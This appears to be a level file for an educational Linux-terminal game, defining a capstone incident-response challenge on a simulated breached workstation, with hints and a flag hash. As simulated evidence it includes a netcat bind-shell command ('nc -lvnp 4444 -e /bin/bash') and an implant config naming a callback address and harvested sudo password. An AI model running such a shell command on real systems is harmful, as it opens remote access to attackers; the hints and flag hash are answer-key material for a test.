import type { Level } from '../../engine/game/level';
import lootSealed from './files/loot.txt?sealed';
import { asSealed } from '../_sealed';

const loot = asSealed(lootSealed);

const BRIEF = `INCIDENT REPORT — corp-ws-14
============================

This workstation was breached. Your job is to investigate it end to end. You
have everything you need from the lessons; there is no step-by-step coaching
this time — open the Hints tab if you get stuck.

1. Something is still running and listening for the attacker. Find it and stop
   it.        (ps / kill)
2. The intruder dropped files on disk. Search the whole system for what it left
   behind.    (find … 2>/dev/null)
3. Read what you find. It points at the stolen data and carries a harvested
   credential.
4. The stolen data is in a file only root can read. Use what you found to
   recover it.  (sudo)

Good luck.
`;

// The intruder's dropped config: world-readable, with the loot path and the password it harvested.
const EXFIL = `# harvested by implant — do not commit
target = /root/loot.txt
sudo_password = gu3st-p4ss
callback = 198.51.100.7:4444
`;

export const level00m: Level = {
  id: '00m-capstone',
  chapter: 0,
  title: 'Chapter 0 Finale: Incident Response',
  briefing:
    'A graduation challenge: this workstation was breached and you must work it end to end, with no ' +
    'step-by-step coaching. Stop the backdoor that is still running (ps / kill), search the whole ' +
    'filesystem for the files the intruder dropped (find … 2>/dev/null), read what you find — it ' +
    'names the stolen data and carries a harvested password — and use it to read a file only root ' +
    'can open (sudo). Everything you need came from the earlier lessons; the Hints tab is there if ' +
    'you get stuck.',
  objective:
    'Kill the backdoor, find the dropped config, and use the harvested password to sudo-read the loot.',
  debrief:
    'You chained the whole toolkit: see what is running, stop it, find what was left, read it, and ' +
    'escalate with a recovered credential. That is the shape of real incident response — and of ' +
    'real intrusions. From here, the numbered chapters are full missions built on exactly these ' +
    'moves.',
  skills: ['ps', 'kill', 'find', 'sudo', 'incident response'],
  startUser: 'guest',
  startHost: 'corp-ws-14',
  startCwd: '/home/guest',
  users: [{ name: 'guest', uid: 1000, gecos: 'Guest', groups: ['sudo'], password: 'gu3st-p4ss' }],
  motd: 'corp-ws-14 — investigate.\n',
  processes: [
    { pid: 812, user: 'guest', command: '-bash', tty: 'pts/0', stat: 'Ss', start: '09:01' },
    {
      pid: 6666,
      user: 'guest',
      command: 'nc -lvnp 4444 -e /bin/bash',
      cpu: 0.4,
      tty: '?',
      stat: 'S',
      start: '09:05',
    },
    { pid: 655, user: 'root', command: '/usr/sbin/cron -f', tty: '?', start: '09:00' },
  ],
  fs: {
    '/home/guest/incident.txt': { content: BRIEF, owner: 'guest' },
    // What the intruder dropped: a hidden dir under /var/tmp, world-readable.
    '/var/tmp': { dir: true, owner: 'root', mode: '1777' },
    '/var/tmp/.harvest': { dir: true, owner: 'guest', mode: '0755' },
    '/var/tmp/.harvest/exfil.conf': { content: EXFIL, owner: 'guest', mode: '0644' },
    // The stolen data: only root may read it, so you must sudo.
    '/root': { dir: true, owner: 'root', mode: '0700' },
    '/root/loot.txt': { content: loot, owner: 'root', mode: '0600' },
  },
  flagHash: 'e1d6406ef8d445157ba838bbfebd14964117af8bee6e17960a1640c2a4c9956b',
  hints: [
    'Start by seeing everything that runs: `ps aux`. A line listening on port 4444 (nc … -e /bin/bash) is the backdoor — stop it with `kill -9 <pid>`.',
    'Now find what the intruder dropped: `find / -name "*.conf" 2>/dev/null` (or search for "harvest"/"exfil"). Read the file it turns up with `cat`.',
    'That config gives the loot path (/root/loot.txt) and the sudo password (gu3st-p4ss). Read the root-only file: `sudo cat /root/loot.txt`, then submit the flag.',
  ],
  parTimeSec: 600,
  onCommand: (event, api) => {
    const line = (en: string, he: string): void =>
      api.echo(`\x1b[36m${api.locale === 'he' ? he : en}\x1b[0m`);

    // One light acknowledgement when the backdoor is killed, then leave them to investigate.
    if (
      event.name === 'kill' &&
      event.exitCode === 0 &&
      event.args.includes('6666') &&
      api.once('killed')
    ) {
      line(
        'Backdoor stopped. Now find what the intruder left behind (find … 2>/dev/null).',
        'הדלת האחורית נעצרה. עכשיו מצאו מה שהפולש השאיר מאחוריו (find … 2>/dev/null).',
      );
      return;
    }
    // Only nudge a player who is clearly off-track (an unknown command), and only once.
    const known = new Set([
      'ps',
      'kill',
      'find',
      'cat',
      'grep',
      'sudo',
      'ls',
      'cd',
      'less',
      'head',
      'tail',
      'submit',
      'hint',
      'mission',
      'clear',
      'help',
    ]);
    if (!known.has(event.name) && api.once('nudge')) {
      line(
        'Read incident.txt for the brief, or open the Hints tab. Start with  ps aux',
        'קראו את incident.txt לתדריך, או פתחו את לשונית הרמזים. התחילו עם  ps aux',
      );
    }
  },
};
